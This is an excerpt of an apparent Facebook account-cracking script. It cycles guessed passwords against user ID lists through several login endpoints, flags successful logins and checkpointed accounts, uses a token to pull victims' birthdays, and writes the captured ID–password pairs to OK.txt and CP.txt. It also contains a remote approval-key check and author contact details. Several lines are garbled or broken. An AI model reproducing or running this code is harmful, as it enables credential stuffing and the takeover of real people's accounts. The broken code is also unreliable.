...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#PURNO_SHAH('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			print (' [*]=============================================')
			self.id = PURNO(self.apk).read().splitlines()
			PURNO_SHAH(' [*] Total ID : %s'%(len(self.id)))
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							PURNO_SHAH('[•] Result CP saved to CP.txt')
							PURNO_SHAH('\n\tCrack Processing...\n')
							PURNO_SHAH('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					PURNO_SHAH('\n01.) Metode b-api ')
					PURNO_SHAH('02.) Metode mbasic ')
					PURNO_SHAH('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			PURNO_SHAH('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			PURNO_SHAH(' [1] PURNO Method 1 ')
			PURNO_SHAH(' [2] PURNO Method 2  [ Pro ]')
			PURNO_SHAH(' [3] PURNO Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [PURNO] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			try:
				ua_xiaomi = PURNO('agent.txt', 'r').read()
			...
			if "access_token" in p:
				PURNO_SHAH('\r\033[1;92m[Successful-PURNO] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					token = PURNO('login.txt').read()
					cp_ttl = Prof_PURNO('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					PURNO_SHAH('\r\033[1;91m[Checkpoint-PURNO] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				PURNO_SHAH('\r\033[1;91m[Checkpoint-PURNO] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				PURNO_SHAH('\r\033[1;32m[Successful-PURNO] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].PURNO_SHAH('\r\033[1;91m[Checkpoint-AKING] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				IMTIAZ_AKING('\r\033[1;92m[Successful-PURNO] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
...
────────────────
    ...
    Facebook : https://www.facebook.com/mr.darkness.p
    Team     : 5G SPAMMER TEAM 💓
    contact  : 01756462587
 [*]=============================================
...
a=requests.get(" https://raw.githubusercontent.com/Purn0h4x0r/Random-clone-p/main/Approval.txt ")
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
...
def sep():
	logo()
	os.system("https://youtube.com/@darkman.p(3)
	readline___Public_Xml()
